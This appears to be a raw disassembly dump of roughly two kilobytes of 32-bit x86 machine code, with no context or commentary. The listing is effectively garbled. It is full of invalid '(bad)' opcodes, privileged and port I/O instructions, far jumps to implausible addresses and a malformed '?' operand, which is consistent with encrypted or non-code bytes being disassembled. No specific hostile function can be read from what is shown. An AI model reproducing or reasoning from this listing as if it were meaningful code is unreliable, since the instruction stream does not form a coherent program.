  4258c8:	mov    ds:0xf6b539a9,al
  4258cd:	mov    ch,0xd6
  4258cf:	test   DWORD PTR [ecx],edx
  4258d1:	sub    eax,0xbc1582e2
  4258d6:	arpl   WORD PTR [esi-0x79d3b0d6],cx
  4258dc:	xor    cl,BYTE PTR [edx+0xa758221]
  4258e2:	add    DWORD PTR [ecx+ecx*2+0x5402c32a],eax
  4258e9:	sbb    BYTE PTR [esp+eiz*4],ch
  4258ec:	add    eax,0x283e2dac
  4258f1:	(bad)  
  4258f2:	adc    ah,bl
  4258f4:	pushf  
  4258f5:	leave  
  4258f6:	inc    edx
  4258f7:	pop    eax
  4258f8:	(bad)  
  4258fa:	jl     0x425949
  4258fc:	aas    
  4258fd:	push   esp
  4258fe:	or     ecx,DWORD PTR [edx+0x3c]
  425901:	jbe    0x425921
  425903:	sub    esi,DWORD PTR [ebp+0xb]
  425906:	mov    edx,0x931f523f
  42590b:	inc    ecx
  42590c:	jmp    0xa813e62
  425911:	xchg   esi,eax
  425912:	xchg   edx,eax
  425913:	mov    al,0xd8
  425915:	adc    DWORD PTR [eax+0x1db3cde6],edx
  42591b:	aad    0xac
  42591d:	fdivrp st(6),st
  42591f:	mov    ecx,0x61657def
  425924:	call   0xccb7:0x9b1b8dac
  42592b:	pop    edx
  42592c:	sub    DWORD PTR [eax+0x70765be5],eax
  425932:	pop    edx
  425933:	sub    eax,0xe34e110e
  425938:	cli    
  425939:	pop    ebp
  42593a:	mov    ah,0x12
  42593c:	call   DWORD PTR [ebx]
  42593e:	cld    
  42593f:	hlt    
  425940:	inc    ebp
  425941:	(bad)  
  425942:	imul   BYTE PTR [edx-0x6cca9404]
  425948:	imul   edi,edi,0x16bd4b65
  42594e:	popf   
  42594f:	mov    dl,0xd0
  425951:	mov    dl,BYTE PTR [eax+0x344e1c51]
  425957:	(bad)  
  425958:	sbb    BYTE PTR [ebp+0x282f35cb],al
  42595e:	stos   BYTE PTR es:[edi],al
  42595f:	jg     0x4259b5
  425961:	mov    ebx,0xd1e6dd9b
  425966:	int3   
  425967:	or     bh,ch
  425969:	popa   
  42596a:	fisttp QWORD PTR [ecx-0x2d]
  42596d:	test   bh,bl
  42596f:	jns    0x425933
  425971:	into   
  425972:	rcl    ah,1
  425974:	fcmovne st,st(3)
  425976:	lods   al,BYTE PTR ds:[esi]
  425977:	icebp  
  425978:	xchg   edx,eax
  425979:	rcr    edx,0xc5
  42597c:	dec    esp
  42597d:	jns    0x425949
  42597f:	inc    ebx
  425980:	inc    edx
  425981:	or     al,0x30
  425983:	sbb    eax,0x38407c03
  425988:	out    0x21,al
  42598a:	scas   al,BYTE PTR es:[edi]
  42598b:	mov    dl,BYTE PTR [ecx+0x16]
  42598e:	xchg   edx,eax
  42598f:	push   esi
  425990:	xor    BYTE PTR [edx+0x66093246],0xf
  425997:	(bad)  
  425998:	jl     0x425991
  42599a:	fidivr WORD PTR [ebx-0x17]
  42599d:	nop
  42599e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42599f:	sub    al,0x70
  4259a1:	pop    es
  4259a2:	int3   
  4259a3:	gs icebp 
  4259a5:	sqrtps xmm1,XMMWORD PTR [edi]
  4259a8:	popa   
  4259a9:	jmp    0xee6394ec
  4259ae:	lods   al,BYTE PTR ds:[esi]
  4259af:	pop    edi
  4259b0:	out    0xbc,al
  4259b2:	cmc    
  4259b3:	xchg   edx,eax
  4259b4:	push   0x80b0236a
  4259b9:	cli    
  4259ba:	sbb    al,0xbc
  4259bc:	and    eax,0x34c7877c
  4259c1:	das    
  4259c2:	pop    eax
  4259c3:	sub    edi,esi
  4259c5:	cdq    
  4259c6:	mov    edx,0x94758efc
  4259cb:	imul   edi,ebp,0xffffffd2
  4259ce:	jp     0x4259f9
  4259d0:	fld    DWORD PTR [edx-0x12]
  4259d3:	or     al,0x20
  4259d5:	mov    dl,0xad
  4259d7:	adc    BYTE PTR [edx-0x64222ce7],dl
  4259dd:	adc    eax,0x4b92f65a
  4259e2:	cdq    
  4259e3:	adc    al,0x19
  4259e5:	sbb    cl,BYTE PTR [eax]
  4259e7:	jns    0x42597f
  4259e9:	jne    0x425a0d
  4259eb:	or     DWORD PTR [ebx-0xbb8a58c],ebx
  4259f1:	cwde   
  4259f2:	icebp  
  4259f3:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4259f5:	xchg   edx,eax
  4259f6:	jmp    0x9b19223a
  4259fb:	jmp    0xb1541148
  425a00:	arpl   WORD PTR [ecx+eax*8+0x38],cx
  425a04:	mov    bl,0xf8
  425a06:	dec    ebp
  425a07:	mov    al,0xd1
  425a09:	fcom   DWORD PTR [ebx]
  425a0b:	push   esi
  425a0c:	cmp    BYTE PTR [esi],0x7e
  425a0f:	mov    ah,0xe2
  425a11:	mov    bh,al
  425a13:	and    ebp,esp
  425a15:	mov    ecx,0x555470d6
  425a1a:	iret   
  425a1b:	cmp    dh,bh
  425a1d:	nop
  425a1e:	push   edx
  425a1f:	adc    DWORD PTR [eax-0x4],edx
  425a22:	dec    esi
  425a23:	mov    esp,0x8e39d180
  425a28:	and    eax,0x25e6f670
  425a2d:	mov    bl,0x9f
  425a2f:	adc    al,0x2d
  425a31:	xchg   BYTE PTR [ebx+0x18],bl
  425a34:	jbe    0x425a42
  425a36:	cs push 0xf12a69d9
  425a3c:	aam    0x2d
  425a3e:	je     0x4259f5
  425a40:	pusha  
  425a41:	aam    0xdf
  425a43:	repz sar BYTE PTR [ecx],0xfc
  425a47:	xchg   edi,eax
  425a48:	cmp    BYTE PTR [ebp-0x41],dl
  425a4b:	mov    gs,eax
  425a4d:	js     0x425a4c
  425a4f:	and    ebp,ebp
  425a51:	and    DWORD PTR [ebx-0x59],ebx
  425a54:	sbb    DWORD PTR ds:0x6aa422e1,edi
  425a5a:	lahf   
  425a5b:	(bad)  
  425a5d:	xlat   BYTE PTR ds:[ebx]
  425a5e:	inc    ebx
  425a5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a60:	mov    ebx,eax
  425a62:	sub    eax,0x4b77247a
  425a67:	out    0x91,eax
  425a69:	pop    esi
  425a6a:	jmp    0x425ae0
  425a6c:	into   
  425a6d:	sahf   
  425a6e:	dec    ebp
  425a6f:	cli    
  425a70:	jg     0x425a37
  425a72:	sub    ecx,esp
  425a74:	sbb    DWORD PTR [ebx],esp
  425a76:	sti    
  425a77:	fimul  WORD PTR [ecx]
  425a79:	sub    eax,0x8cffbdf
  425a7e:	popf   
  425a7f:	pop    ss
  425a80:	pop    ebp
  425a81:	aad    0x44
  425a83:	sbb    ebx,edx
  425a85:	retf   
  425a86:	retf   
  425a87:	or     dl,BYTE PTR [esi-0x75]
  425a8a:	and    al,0x6a
  425a8c:	imul   edx,ebp,0x56
  425a8f:	aaa    
  425a90:	mov    ah,0x8e
  425a92:	out    dx,eax
  425a93:	xchg   ecx,eax
  425a94:	loopne 0x425ab1
  425a96:	push   esp
  425a97:	adc    dl,BYTE PTR [eax]
  425a99:	xor    eax,0xd50eef14
  425a9e:	push   edx
  425a9f:	add    al,0x5d
  425aa1:	rep outs dx,BYTE PTR ds:[esi]
  425aa3:	pop    ebp
  425aa4:	gs loopne 0x425a6a
  425aa7:	mov    esi,0x788778fd
  425aac:	xchg   edi,eax
  425aad:	inc    edi
  425aae:	outs   dx,DWORD PTR ds:[esi]
  425aaf:	adc    eax,0x3c50af34
  425ab4:	ja     0x425b23
  425ab6:	out    0xab,eax
  425ab8:	mov    ds:0x4806a9de,eax
  425abd:	fs jns 0x425a9a
  425ac0:	adc    bl,BYTE PTR [edx-0x1ad2cf35]
  425ac6:	sub    ah,BYTE PTR [esi]
  425ac8:	loop   0x425b2c
  425aca:	adc    al,BYTE PTR fs:[ecx-0x46]
  425ace:	lea    eax,[esi+0x39a7a6d5]
  425ad4:	popw   ss
  425ad6:	cwde   
  425ad7:	push   ss
  425ad8:	xor    al,0x50
  425ada:	push   ecx
  425adb:	cmp    eax,0x3166382b
  425ae0:	dec    edi
  425ae1:	call   FWORD PTR ds:0xe4c726af
  425ae7:	ds jmp 0x1b02863e
  425aed:	inc    esp
  425aee:	and    BYTE PTR [edx-0x59276fa4],0x37
  425af5:	aaa    
  425af6:	fidiv  DWORD PTR [ebx+edx*2+0x48]
  425afa:	test   al,0xca
  425afc:	mov    ds:0xf4df0fa0,al
  425b01:	pop    ss
  425b02:	push   es
  425b03:	cmp    ch,bl
  425b05:	and    DWORD PTR [ecx+ebp*1],edi
  425b08:	test   BYTE PTR [ecx+0x116fbf1c],dh
  425b0e:	imul   DWORD PTR [edx+0x15]
  425b11:	cmp    esi,edx
  425b13:	das    
  425b14:	jle    0x425aca
  425b16:	add    DWORD PTR [ecx],ecx
  425b18:	loopne 0x425b98
  425b1a:	inc    ebp
  425b1b:	push   cs
  425b1c:	cli    
  425b1d:	adc    DWORD PTR [ebp+0x25],eax
  425b20:	jb     0x425b75
  425b22:	les    ecx,FWORD PTR [eax]
  425b24:	out    0xcf,eax
  425b26:	mov    dl,0x1c
  425b28:	ja     0x425b72
  425b2a:	enter  0xe978,0x39
  425b2e:	push   ds
  425b2f:	cmp    al,0x86
  425b31:	cmp    DWORD PTR [edi+0x5c],edi
  425b34:	std    
  425b35:	adc    BYTE PTR [edi],bh
  425b37:	add    eax,0x9766037a
  425b3c:	xchg   edi,eax
  425b3d:	jns    0x425af1
  425b3f:	mov    ebx,0xaaf2365b
  425b44:	mov    esp,0x17d7327c
  425b49:	dec    eax
  425b4a:	test   eax,0xc0895b7d
  425b4f:	ins    DWORD PTR es:[edi],dx
  425b50:	xchg   edi,eax
  425b52:	ret    0x716
  425b55:	ret    
  425b56:	mov    edi,0xf7b00fd1
  425b5b:	jno    0x425b2b
  425b5d:	sub    esi,0xffffff94
  425b60:	shl    DWORD PTR [ecx],1
  425b62:	retf   
  425b63:	pop    ss
  425b64:	add    ecx,DWORD PTR [eax+0x7d]
  425b67:	inc    esp
  425b68:	into   
  425b69:	ins    DWORD PTR es:[edi],dx
  425b6a:	inc    ebp
  425b6b:	push   esi
  425b6c:	add    al,0xe5
  425b6e:	into   
  425b6f:	jge    0x425be7
  425b71:	mov    bl,0xc4
  425b73:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b75:	and    eax,0x3efbb8d9
  425b7a:	mov    ah,0x7f
  425b7c:	cwde   
  425b7d:	adc    ecx,DWORD PTR [eax]
  425b7f:	out    dx,al
  425b80:	sub    al,0xe5
  425b82:	add    al,0x52
  425b84:	std    
  425b85:	mov    edi,ebp
  425b87:	push   ebp
  425b88:	xchg   ebp,eax
  425b89:	outs   dx,BYTE PTR ds:[esi]
  425b8a:	pop    ebx
  425b8b:	enter  0x9845,0x3e
  425b8f:	jle    0x425bfc
  425b91:	jmp    0xa3de33de
  425b96:	cmp    eax,0xcf418f0d
  425b9b:	push   eax
  425b9c:	fst    DWORD PTR [ecx+0x71]
  425b9f:	add    al,0x5b
  425ba1:	mov    dl,0x13
  425ba3:	mov    dh,0x8d
  425ba5:	test   eax,0xb0c6043
  425baa:	pop    esi
  425bab:	mov    al,0x66
  425bad:	inc    eax
  425bae:	ds jno 0x425b9c
  425bb1:	sub    eax,0x8a122e94
  425bb6:	out    dx,eax
  425bb7:	xchg   esp,eax
  425bb8:	push   ebx
  425bb9:	stos   DWORD PTR es:[edi],eax
  425bba:	mov    ds:0x3306c6b8,al
  425bbf:	sub    ah,dl
  425bc1:	xor    cl,BYTE PTR ds:0xfd8187e4
  425bc7:	jge    0x425ba6
  425bc9:	inc    esp
  425bca:	sbb    DWORD PTR [ebp+ecx*8+0x365c3787],esp
  425bd1:	pop    eax
  425bd2:	jae    0x425bd2
  425bd4:	pushf  
  425bd5:	xchg   edx,eax
  425bd6:	jo     0x425c17
  425bd8:	retf   
  425bd9:	pop    ds
  425bda:	pop    esp
  425bdb:	ret    
  425bdc:	jecxz  0x425b61
  425bde:	mov    al,0x68
  425be0:	lds    edx,FWORD PTR [ebx]
  425be2:	outs   dx,DWORD PTR ds:[esi]
  425be3:	xor    al,0xd6
  425be5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425be6:	fs inc ebx
  425be8:	pop    ds
  425be9:	inc    ebp
  425bea:	into   
  425beb:	mov    cl,0xd2
  425bed:	(bad)  [edx-0x63e8879]
  425bf3:	pop    esp
  425bf4:	je     0x425c15
  425bf6:	clc    
  425bf7:	lock popa 
  425bf9:	push   0xfffffffc
  425bfb:	retf   0x4e0f
  425bfe:	push   edi
  425bff:	cmp    bh,BYTE PTR [edi-0x236e2d47]
  425c05:	enter  0x8bb6,0xb4
  425c09:	(bad)  
  425c0a:	adc    ah,bh
  425c0c:	sub    al,0x38
  425c0e:	xchg   edx,eax
  425c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c10:	bound  ecx,QWORD PTR [ebp+ecx*4+0x5ba1ec40]
  425c17:	adc    DWORD PTR [esi],0x32cafc3
  425c1d:	jmp    0x30bc1fa9
  425c22:	jl     0x425c9c
  425c24:	add    DWORD PTR [ebx+0x3ae8e791],edi
  425c2a:	jmp    0xc7f946ad
  425c2f:	jne    0x425c81
  425c31:	das    
  425c32:	xor    BYTE PTR [edi-0x3f],ch
  425c35:	arpl   WORD PTR [ebx+edi*2-0x213132fc],bx
  425c3c:	popf   
  425c3d:	push   ds
  425c3e:	repz inc edi
  425c40:	in     eax,0xc0
  425c42:	dec    ecx
  425c43:	pop    ecx
  425c44:	pop    esp
  425c45:	out    dx,al
  425c46:	push   edi
  425c47:	dec    ebp
  425c48:	fwait
  425c49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c4a:	(bad)  
  425c4b:	pop    eax
  425c4c:	jge    0x425c2c
  425c4e:	inc    ebx
  425c4f:	retf   0xc93b
  425c52:	das    
  425c53:	dec    ecx
  425c54:	test   DWORD PTR [esi+0x64ebed58],ecx
  425c5a:	repnz lea ebx,[esi+0x5e38c83c]
  425c61:	ins    BYTE PTR es:[edi],dx
  425c62:	outs   dx,BYTE PTR ds:[esi]
  425c63:	xchg   edi,eax
  425c64:	sub    ecx,DWORD PTR [ebp-0x51]
  425c67:	(bad)
  425c6a:	int3   
  425c6b:	adc    edx,eax
  425c6d:	fadd   DWORD PTR [edx-0xb]
  425c70:	ins    BYTE PTR es:[edi],dx
  425c71:	shl    ebx,0x0
  425c74:	fs jb  0x425c9b
  425c77:	mov    cl,0xff
  425c79:	std    
  425c7a:	cli    
  425c7b:	mov    al,0x1
  425c7d:	add    esp,0xc04141e8
  425c83:	loopne 0x425c2c
  425c85:	cmp    eax,0xf73c93bc
  425c8a:	sub    dh,0xcc
  425c8d:	jbe    0x425c72
  425c8f:	test   eax,0xede7983f
  425c94:	mov    ds:0x5cad9c5e,eax
  425c99:	adc    bl,BYTE PTR [edi-0x69]
  425c9c:	mov    eax,0xcc92dd4b
  425ca1:	stos   BYTE PTR es:[edi],al
  425ca2:	jno    0x425c67
  425ca4:	dec    esi
  425ca5:	push   edx
  425ca6:	ds pop esi
  425ca8:	lock jae 0x425cc9
  425cab:	mov    DWORD PTR [edi+0x4bdd82b3],edx
  425cb1:	sti    
  425cb2:	adc    al,0x41
  425cb4:	stos   BYTE PTR es:[edi],al
  425cb5:	add    bl,al
  425cb7:	retf   
  425cb8:	inc    ebp
  425cb9:	xor    eax,0xe70e8272
  425cbe:	adc    al,0x13
  425cc0:	mov    cl,0xe9
  425cc2:	push   eax
  425cc3:	mov    ?,WORD PTR [eax-0x1946ec57]
  425cc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425cca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ccb:	or     ecx,DWORD PTR [edi-0x3]
  425cce:	mov    BYTE PTR [ebx],dh
  425cd0:	pop    ds
  425cd1:	mov    ecx,0x7b82eb4b
  425cd6:	dec    edi
  425cd7:	mov    bh,0x89
  425cd9:	jae    0x425cd2
  425cdb:	xchg   ebp,eax
  425cdc:	mov    ds:0x9fc0db25,al
  425ce1:	xor    DWORD PTR [edx+0x3a],ebx
  425ce4:	std    
  425ce5:	fsub   st,st(2)
  425ce7:	or     eax,0x7e06d2da
  425cec:	lods   al,BYTE PTR ds:[esi]
  425ced:	fs adc ah,cl
  425cf0:	imul   edi,esi,0x72
  425cf3:	lock fnsave [ebp+0x7bd6c2cf]
  425cfa:	arpl   WORD PTR [ebp-0x37066a0],bx
  425d00:	loopne 0x425d0f
  425d02:	sar    edi,cl
  425d04:	sub    al,0xe6
  425d06:	in     al,0xdc
  425d08:	mov    bl,0x41
  425d0a:	xor    BYTE PTR [edx+0x7ccb6544],0x38
  425d11:	stos   DWORD PTR es:[edi],eax
  425d12:	cs call 0x10a8571b
  425d18:	add    edx,edx
  425d1a:	ja     0x425d88
  425d1c:	mov    edx,0x5a961404
  425d21:	dec    ecx
  425d22:	push   ss
  425d23:	sub    ch,0x0
  425d26:	fadd   DWORD PTR [edx+0xd]
  425d29:	aas    
  425d2a:	pop    es
  425d2b:	call   DWORD PTR [eax+edx*1+0x45]
  425d2f:	call   0xd72b0de3
  425d34:	jp     0x425d4f
  425d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d37:	loopne 0x425cd4
  425d39:	jg     0x425dba
  425d3b:	jne    0x425ce9
  425d3d:	add    ax,ax
  425d40:	mov    ch,BYTE PTR [edi]
  425d42:	sbb    esp,DWORD PTR [ebx]
  425d44:	adc    BYTE PTR [ebx+eiz*8+0xa],al
  425d48:	lods   eax,DWORD PTR ds:[esi]
  425d49:	ins    DWORD PTR es:[edi],dx
  425d4a:	cdq    
  425d4b:	pop    edx
  425d4c:	clc    
  425d4d:	fnstsw WORD PTR [ecx]
  425d4f:	inc    esp
  425d50:	push   0x7aa2b4a2
  425d55:	ss mov eax,0x18aeb4a2
  425d5b:	in     eax,dx
  425d5c:	aad    0xe6
  425d5e:	cdq    
  425d5f:	inc    esi
  425d60:	out    dx,eax
  425d61:	xchg   BYTE PTR [edx-0x280b37cb],bl
  425d67:	pop    ebp
  425d68:	aam    0x5c
  425d6a:	fisttp DWORD PTR [esi-0x51]
  425d6d:	xchg   esp,eax
  425d6e:	retf   0x8ec4
  425d71:	and    bh,BYTE PTR [esi]
  425d73:	jle    0x425d95
  425d75:	mov    WORD PTR [edx-0x1f],ss
  425d78:	push   esi
  425d79:	cmp    BYTE PTR [ecx],al
  425d7b:	cmp    DWORD PTR [ecx+ebx*2],esp
  425d7e:	push   esi
  425d7f:	sub    edi,esp
  425d81:	push   eax
  425d82:	loop   0x425dc5
  425d84:	icebp  
  425d85:	add    DWORD PTR [eax+0x50],esi
  425d88:	outs   dx,BYTE PTR ds:[esi]
  425d89:	sbb    ah,BYTE PTR [eax-0x6c]
  425d8c:	push   esp
  425d8d:	inc    edx
  425d8e:	sub    cl,BYTE PTR ds:0x65debd1f
  425d94:	inc    ecx
  425d95:	mov    cs,WORD PTR ds:0x153818f5
  425d9b:	push   esi
  425d9c:	ret    0x9240
  425d9f:	loope  0x425d43
  425da1:	push   es
  425da2:	adc    al,0x54
  425da4:	xchg   edx,ebx
  425da6:	xor    esp,DWORD PTR ds:0xbec045d9
  425dac:	inc    ecx
  425dad:	pop    ebx
  425dae:	xchg   ecx,eax
  425daf:	xchg   BYTE PTR [edi+0x173b26],ch
  425db5:	push   0xffffffcf
  425db7:	mov    ds:0xb42a3bab,al
  425dbc:	sti    
  425dbd:	pop    ecx
  425dbe:	sbb    DWORD PTR [ecx+ebp*2-0x4d2bf01f],esi
  425dc5:	mov    cl,0x5d
  425dc7:	pop    es
  425dc8:	jb     0x425e43
  425dca:	out    0x19,al
  425dcc:	xor    BYTE PTR [edi],ch
  425dce:	pop    esi
  425dcf:	mov    dh,0x8a
  425dd1:	ds xchg ecx,ebx
  425dd4:	dec    edx
  425dd5:	outs   dx,DWORD PTR ds:[esi]
  425dd6:	jo     0x425d71
  425dd8:	adc    eax,DWORD PTR [edi-0x52]
  425ddb:	out    0x36,al
  425ddd:	pop    esi
  425dde:	fdiv   QWORD PTR [edx+0x58158b74]
  425de4:	pop    ebx
  425de5:	loop   0x425e19
  425de7:	adc    bh,BYTE PTR [esp+ebp*1-0x7b5959b3]
  425dee:	arpl   bx,si
  425df0:	aad    0x6
  425df2:	clc    
  425df3:	pop    esp
  425df4:	or     bh,BYTE PTR [esi+0x40]
  425df7:	xchg   esi,eax
  425df8:	sbb    cl,BYTE PTR [ebp+0x24acc1d2]
  425dfe:	ins    BYTE PTR es:[edi],dx
  425dff:	fisttp DWORD PTR [edi-0x6a]
  425e02:	mov    al,ds:0xab23f0e9
  425e07:	retf   0x1d47
  425e0a:	fadd   QWORD PTR [ebx+0x5b71c867]
  425e10:	outs   dx,BYTE PTR ds:[esi]
  425e11:	lea    edi,[ecx+0x65]
  425e14:	adc    eax,0x1c2be0a8
  425e19:	and    BYTE PTR [ebx+0x70bcd39d],bh
  425e1f:	js     0x425e05
  425e21:	pusha  
  425e22:	dec    edx
  425e23:	or     BYTE PTR cs:[ebx+edi*8],bh
  425e27:	pop    ecx
  425e28:	loop   0x425e49
  425e2a:	(bad)  
  425e2c:	add    ah,BYTE PTR [eax]
  425e2e:	push   esi
  425e2f:	shl    BYTE PTR [ecx],0x1a
  425e32:	jne    0x425e33
  425e34:	pop    ebx
  425e35:	mov    al,0x11
  425e37:	pop    ds
  425e38:	out    dx,al
  425e39:	fs jns 0x425e88
  425e3c:	into   
  425e3d:	dec    edi
  425e3e:	xchg   BYTE PTR [edx-0x439dd6b6],cl
  425e44:	add    BYTE PTR [eax],al
  425e46:	add    BYTE PTR [eax],al
  425e48:	add    BYTE PTR [eax],al
  425e4a:	inc    edx
  425e4b:	inc    esp
  425e4c:	inc    ebp
  425e4d:	pop    eax
  425e4e:	inc    edi
  425e4f:	pop    ecx
  425e50:	pop    edi
  425e51:	pop    esi
  425e52:	mov    bl,0x51
  425e54:	push   eax
  425e55:	mov    cl,0xf6
  425e57:	fs test dh,bh
  425e5a:	bnd jmp 0x425e5e
  425e5d:	add    BYTE PTR [edx-0x5fffffa],al
  425e63:	inc    esp
  425e64:	mov    bl,0x47
  425e66:	mul    DWORD PTR [edi+eax*2-0x267e488c]
  425e6d:	push   esi
  425e6e:	inc    eax
  425e6f:	xchg   BYTE PTR [edi],bl
  425e71:	adc    ch,ch
  425e73:	mov    esi,eax
  425e75:	cmp    eax,DWORD PTR [eax+edx*2-0x210a3528]
  425e7c:	imul   esi,esp,0x28c7bce7
  425e82:	mov    al,ds:0x8d8d1034
  425e87:	lods   eax,DWORD PTR ds:[esi]
  425e89:	and    bh,BYTE PTR [ebx+0x454c9fbf]
  425e8f:	adc    eax,0xc2399d3e
  425e94:	rol    al,cl
  425e96:	sbb    DWORD PTR [edx+ecx*2-0x42942648],0x68
  425e9e:	ret    
  425e9f:	pop    ebp
  425ea0:	mov    ecx,0x925fe247
  425ea5:	das    
  425ea6:	(bad)  
  425ea7:	cli    
  425ea8:	push   es
  425ea9:	mov    bl,0x22
  425eab:	ficomp DWORD PTR [ecx]
  425ead:	dec    esi
  425eae:	mov    cl,0x3f
  425eb0:	and    ebp,DWORD PTR [esi]
  425eb2:	add    al,0xee
  425eb4:	rcr    BYTE PTR [eax-0x8],cl
  425eb7:	mov    esi,0x5f2ed8ec
  425ebc:	sbb    bh,ah
  425ebe:	xchg   BYTE PTR ds:[ebx+0x335a8fbd],ch
  425ec5:	and    edx,DWORD PTR [si]
  425ec8:	or     al,0xcd
  425eca:	ret    0x145a
  425ecd:	stos   BYTE PTR es:[edi],al
  425ece:	add    BYTE PTR [eax+0x2742fa52],bh
  425ed4:	jns    0x425ef2
  425ed6:	sbb    al,0x1b
  425ed8:	sbb    eax,0x238d1640
  425edd:	pusha  
  425ede:	dec    ecx
  425edf:	imul   DWORD PTR ds:0xf03b16f0
  425ee5:	dec    edx
  425ee6:	pop    eax
  425ee7:	or     BYTE PTR [esi-0x47381dd4],bl
  425eed:	(bad)  
  425eee:	scas   al,BYTE PTR es:[edi]
  425eef:	or     al,BYTE PTR [edi-0x6d]
  425ef2:	outs   dx,BYTE PTR ds:[esi]
  425ef3:	or     bh,BYTE PTR [eax-0x239eb669]
  425ef9:	cs cmc 
  425efb:	in     eax,dx
  425efc:	stc    
  425efd:	mov    eax,0xad62b58a
  425f02:	in     al,dx
  425f03:	imul   ebp,DWORD PTR [ecx-0x5],0x25
  425f07:	addr16 push edx
  425f09:	sub    eax,0x918143d6
  425f0e:	mov    dl,0x42
  425f10:	popa   
  425f11:	ins    BYTE PTR es:[edi],dx
  425f12:	icebp  
  425f13:	in     eax,0xca
  425f15:	jle    0x425ea3
  425f17:	in     eax,dx
  425f18:	std    
  425f19:	xor    cl,BYTE PTR [ebx-0x2a7d9984]
  425f1f:	repz stc 
  425f21:	aas    
  425f22:	ficom  WORD PTR [edx]
  425f24:	inc    ecx
  425f25:	je     0x425f79
  425f27:	addr16 int3 
  425f29:	mov    cl,0xa9
  425f2b:	js     0x425f04
  425f2d:	cmp    DWORD PTR [edi],ebp
  425f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f30:	mov    edi,0x9fb8b9b
  425f35:	lock push ds
  425f37:	jne    0x425ec3
  425f39:	jns    0x425eda
  425f3b:	ror    eax,cl
  425f3d:	and    al,bl
  425f3f:	mov    cl,0xd2
  425f41:	sub    eax,0x567a0eb9
  425f46:	les    eax,FWORD PTR [ecx]
  425f48:	cvtps2pi mm7,QWORD PTR [eax+0x7a]
  425f4c:	fwait
  425f4d:	and    al,0x66
  425f4f:	pop    es
  425f50:	and    esi,DWORD PTR [edx]
  425f52:	int3   
  425f53:	call   0xc4fd3d4e
  425f58:	inc    eax
  425f59:	(bad)
  425f5d:	mov    ds:0xba5a8cdb,eax
  425f62:	mov    al,0xbe
  425f64:	into   
  425f65:	sbb    bl,bl
  425f67:	jnp    0x425f3d
  425f69:	push   ebp
  425f6a:	call   0x49f2:0xb5017473
  425f71:	mov    esi,0xb344ca1f
  425f76:	jbe    0x425f0c
  425f78:	add    eax,0xc5ac0804
  425f7d:	sbb    ebp,DWORD PTR [esi+0x3150a3ff]
  425f83:	cmp    ah,BYTE PTR [ecx]
  425f85:	inc    esp
  425f86:	push   eax
  425f87:	sub    al,BYTE PTR [esi]
  425f89:	dec    esp
  425f8a:	xchg   esi,eax
  425f8b:	rcr    esp,0xdc
  425f8e:	je     0x425f20
  425f90:	cld    
  425f91:	xor    ah,dl
  425f93:	(bad)  
  425f95:	push   0xffffffcf
  425f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f98:	test   DWORD PTR [ecx+0x46340b67],esi
  425f9e:	jp     0x425f5f
  425fa0:	fwait
  425fa1:	and    BYTE PTR [ebx+0x9],bh
  425fa4:	pop    esp
  425fa5:	cmp    edi,esi
  425fa7:	loope  0x42600e
  425fa9:	inc    ebx
  425faa:	icebp  
  425fab:	cmp    ch,BYTE PTR [ebx+0x6e]
  425fae:	inc    ebx
  425faf:	inc    esi
  425fb0:	cmp    DWORD PTR [esi+0x462b4b23],esi
  425fb6:	inc    esp
  425fb7:	sub    eax,0x4ee9abb2
  425fbc:	add    eax,esi
  425fbe:	pop    esi
  425fbf:	iret   
  425fc0:	loope  0x42603c
  425fc2:	mov    eax,ds:0xd45793ad
  425fc7:	add    al,0x10
  425fc9:	stos   DWORD PTR es:[edi],eax
  425fca:	mov    eax,ds:0x3c96c1fb
  425fcf:	outs   dx,BYTE PTR ds:[esi]
  425fd0:	or     bh,BYTE PTR [eax]
  425fd2:	mov    bl,0xf4
  425fd4:	ins    DWORD PTR es:[edi],dx
  425fd5:	and    al,0xf
  425fd7:	lods   eax,DWORD PTR ds:[esi]
  425fd8:	adc    bh,BYTE PTR [eax+0x776fcaba]
  425fde:	mov    esi,0x712555c
  425fe3:	ror    BYTE PTR [edx-0x44d0a4de],0x9e
  425fea:	rcl    DWORD PTR [edx+0x20a9848d],0xc7
  425ff1:	jmp    0x425fab
  425ff3:	mov    BYTE PTR [edx*4+0x194c9b53],ch
  425ffa:	ror    DWORD PTR [edi],0x3
  425ffd:	frstor [ecx-0x47d10420]
  426003:	or     eax,0x29eca14
  426008:	rol    BYTE PTR [esi+ebx*1],1
  42600b:	dec    edi
  42600c:	(bad)  
  42600d:	pushf  
  42600e:	ja     0x42603b
  426010:	add    bl,dh
  426012:	outs   dx,BYTE PTR ds:[esi]
  426013:	ins    BYTE PTR es:[edi],dx
  426014:	iret   
  426015:	jge    0x425fe6
  426017:	in     al,dx
  426018:	dec    eax
  426019:	or     dh,0xdb
  42601c:	adc    DWORD PTR [ebx-0x7d74e812],0x1ad4f426
  426026:	push   0x40
  426028:	lds    edi,FWORD PTR [ecx]
  42602a:	lock mov eax,DWORD PTR [ecx+0x63]
  42602e:	and    DWORD PTR [esi-0x5f],eax
  426031:	aaa    
  426032:	cli    
  426033:	cmp    eax,0xd4b8f3e
  426038:	mov    eax,ds:0xe12999bc
  42603d:	test   BYTE PTR [edi-0x5ce9c468],al
  426043:	dec    esi
  426044:	adc    edx,DWORD PTR [edi-0x51]
  426047:	fisttp DWORD PTR [esi-0x7c]
  42604a:	and    BYTE PTR [edi],0x51
  42604d:	ins    DWORD PTR es:[edi],dx
  42604e:	pop    eax
  42604f:	xchg   DWORD PTR [edi-0x36],edx
  426052:	shl    BYTE PTR [ebx],0xd6
  426055:	test   DWORD PTR [ebp+0x61936e7e],edi
  42605b:	mov    dl,0xe4
  42605d:	jb     0x426056
  42605f:	and    BYTE PTR [esi+esi*4],0x27
  426063:	les    ecx,FWORD PTR [edx]
  426065:	pop    es
  426066:	dec    ebp
  426067:	sbb    eax,0x19ed190b
